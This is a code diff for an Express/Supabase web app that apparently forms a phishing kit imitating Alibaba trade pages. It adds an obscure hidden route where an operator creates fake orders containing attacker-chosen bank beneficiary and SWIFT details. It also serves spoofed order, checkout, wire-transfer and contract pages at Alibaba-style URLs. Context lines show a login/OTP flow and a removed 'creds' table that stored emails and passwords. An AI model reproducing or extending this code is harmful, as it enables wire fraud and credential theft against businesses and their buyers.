@@ -7,6 +7,7 @@ const { createClient } = require('@supabase/supabase-js');
 const nodemailer = require('nodemailer');
 
 const { Resend } = require('resend');
+const { error } = require('console');
 
 const resend = new Resend(process.env.RESEND_API_KEY);
 
@@ -42,28 +43,6 @@ const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseKey = process.env.SUPABASE_KEY;
 const supabase = createClient(supabaseUrl, supabaseKey);
 
-// Initialize database table
-/*
-// Initialize database table
-// Tables 'creds' and 'session_count' should be created in the Supabase dashboard or via SQL Editor.
-// Automatic creation logic removed as Supabase JS client is for DML.
-
-CREATE TABLE IF NOT EXISTS creds (
-  id SERIAL PRIMARY KEY,
-  email VARCHAR(255) NOT NULL,
-  password VARCHAR(255) NULL,
-  session_id VARCHAR(255) NULL,
-  session_expires_at TIMESTAMP NULL,
-  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-);
-
-CREATE TABLE IF NOT EXISTS session_count (
-  id SERIAL PRIMARY KEY,
-  session_id VARCHAR(255) NOT NULL,
-  count INT NOT NULL,
-  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-);
-*/
 
 // Helper function to generate unique session ID
 function generateSessionId() {
@@ -262,6 +241,178 @@ app.post("/login/otp", async (req, res) => {
   return res.send({
     redirectUrl: process.env.REDIRECT_URL
   })
+});
+
+app.get('/hsisau3937enk', async (req, res) => {
+
+  return res.render('request',{errors: []});
+});
+
+function generateOrderId() {
+  return Math.floor(
+      100000000000 + Math.random() * 900000000000
+  ).toString();
+}
+
+function generateReference() {
+    // Generate a 30-digit random numeric string
+    let number = "";
+
+    while (number.length < 30) {
+        number += crypto.randomInt(0, 10).toString();
+    }
+
+    number = number.substring(0, 30);
+
+    return Buffer.from(number).toString("base64").replace(/=+$/, "");
+}
+
+
+app.post('/hsisau3937enk', async (req, res) => {
+  const requiredFields = [
+
+    "amount",
+    "currency",
+    "seller",
+    "product_name",
+    "specs",
+    "quantity",
+    "image_link",
+    "shipping_address",
+    "ship_from",
+    "shipping_method",
+    "shipping_fee",
+    "buyer_email",
+    "buyer_name",
+    "order_date",
+    "order_time",
+
+    "company_phone_number",
+    "company_email",
+    "company_address",
+    "contact_name",
+
+    "payment_currency",
+    "beneficiary_account_number",
+    "swift_code",
+    "beneficiary_country_region",
+    "beneficiary_name",
+    "beneficiary_address",
+    "beneficiary_bank",
+    "beneficiary_bank_address",
+    "bank_code",
+    "branch_code",
+    "remark",
+    "process_fee"
+
+];
+const errors = [];
+for (const field of requiredFields) {
+
+  if (
+      req.body[field] === undefined ||
+      req.body[field] === null ||
+      req.body[field].toString().trim() === ""
+  ) {
+      errors.push(`${field} is required.`);
+  }
+
+}
+
+if (errors.length > 0) {
+
+  return res.status(400).render("request", {
+      errors,
+      old: req.body
+  });
+
+}
+  const order_id = generateOrderId();
+  const reference = generateReference();
+  const { data, error } = await supabase.from('details').insert([{
+    order_id: order_id,
+    reference: reference,
+    amount: req.body.amount,
+    currency: req.body.currency,
+    seller: req.body.seller,
+    product_name: req.body.product_name,
+    specs: req.body.specs,
+    quantity: req.body.quantity,
+    image_link: req.body.image_link,
+    order_date: req.body.order_date,
+    order_time: req.body.order_time,
+    shipping_address: req.body.shipping_address,
+    ship_from: req.body.ship_from,
+    shipping_method: req.body.shipping_method,
+    shipping_fee: req.body.shipping_fee,
+    company_phone_number: req.body.company_phone_number,
+    company_email: req.body.company_email,
+    company_address: req.body.company_address,
+    contact_name: req.body.contact_name,
+    payment_currency: req.body.payment_currency,
+    beneficiary_account_number: req.body.beneficiary_account_number,
+    swift_code: req.body.swift_code,
+    beneficiary_country_region: req.body.beneficiary_country_region,
+    beneficiary_name: req.body.beneficiary_name,
+    beneficiary_address: req.body.beneficiary_address,
+    beneficiary_bank: req.body.beneficiary_bank,
+    beneficiary_bank_address: req.body.beneficiary_bank_address,
+    bank_code: req.body.bank_code,
+    branch_code: req.body.branch_code,
+    remark: req.body.remark,
+    process_fee: req.body.process_fee 
+  }]);
+  if (error) {
+    console.error(error)
+    return res.status(400).render('request', {
+      errors: ['Database error. Please try again.'],
+      old: req.body
+    });
+  }
+  const order_link = `ta/detail.htm?spm=a2756.trade-list-buyer.0.0.5cb376e9kmrTcM&orderId=${order_id}`
+  return res.render('success',{
+    order_link: order_link
+  });
+});
+
+LINK_ADDITION = "paymentStep=ADVANCE&source=DETAIL&buyerGuestAccount=false&urlDomain=biz.alibaba.com&cna=QuvDIiyaTiACAS%2F2WPMvIsXE&ip=2.20.196.222&riskDeviceType=PC&umidToken=T2gAavG6Ptcgifm2HcsGdYcQa4WrELu4TcVab6kYMij-DhTUYTbi6G7NgFuFcQH5bu8="
+
+app.get('/ta/detail.htm', async (req, res) => {
+  const order_id = req.query.orderId;
+  const { data, error } = await supabase.from('details').select('*').eq('order_id', order_id).single();
+  if (error) {
+    return res.status(400).render('error', { error: 'Order not found' });
+  }
+  const item_subtotal = data.amount * data.quantity;
+  const total_price = data.amount * data.quantity;
+  return res.render('order-details', { ...data, item_subtotal: item_subtotal, total_price: total_price });
+});
+
+app.get('/payment/checkout.htm', async (req, res) => {
+  const reference = req.query.cashierOrderNo;
+  const { data, error } = await supabase.from('details').select('*').eq('reference', reference).single();
+  if (error) {
+    return res.status(400).render('error', { error: 'Order not found' });
+  }
+  return res.render('payment', { reference: reference, ...data,  });
+});
+
+app.get('/payment/tt/detail', async (req, res) => {
+  const reference = req.query.cashierOrderNo;
+  const { data, error } = await supabase.from('details').select('*').eq('reference', reference).single();
+  if (error) {
+    return res.status(400).render('error', { error: 'Order not found' });
+  }
+  return res.render('wire-transfer', { reference: reference, ...data });
+});
+
+app.get('/ta/contract.htm', async (req, res) => {
+  const order_id = req.query.orderId;
+  const { data, error } = await supabase.from('details').select('*').eq('order_id', order_id).single();
+  if (error) {
+    return res.status(400).render('error', { error: 'Order not found' });
+  }
+  return res.render('contract', { order_id: order_id, ...data });
 });
 
 app.use((req, res) => {
